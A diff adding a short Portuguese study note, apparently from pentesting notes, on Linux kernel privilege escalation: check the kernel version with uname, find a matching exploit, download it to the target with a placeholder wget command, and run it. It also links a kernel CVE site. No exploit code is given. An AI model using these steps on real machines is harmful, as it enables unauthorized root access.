@@ -1,0 +1,17 @@
+A ESCALAÇÃO DE PRIVILÉGIOS POR KERNEL, É SIMPLES, MAS NÃO FÁCIL.
+
+	1.IDENTIFIQUE QUAL A VERSÃO DO KERNEL
+		
+		COMANDO: uname -a
+	
+	2.PROCURE UM EXPLOIT PARA ESSA VERSÃO DE KERNEL.
+	
+	3.BAIXE O EXPLOIT NA MÁQUINA ALVO.
+		
+		COMANDO: wget <url_exploit>
+	
+	3.EXECUTE A EXPLORAÇÃO.
+	
+	
+	SITES:
+		https://www.linuxkernelcves.com/cves
